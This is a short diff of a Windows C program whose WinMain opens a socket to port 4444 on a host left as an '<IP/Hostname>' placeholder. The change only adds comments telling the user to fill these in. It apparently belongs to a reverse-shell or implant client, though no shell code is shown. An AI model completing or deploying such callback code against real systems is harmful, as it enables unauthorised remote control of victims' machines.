@@ -28,8 +28,8 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
 
     struct sockaddr_in server;
     server.sin_family = AF_INET;
-    server.sin_port = htons(4444);
-
+    server.sin_port = htons(4444); // Enter port
+                            // Enter IP/Hostname
     if (InetPton(AF_INET, "<IP/Hostname>", &server.sin_addr) <= 0) {
         closesocket(sock);
         WSACleanup();
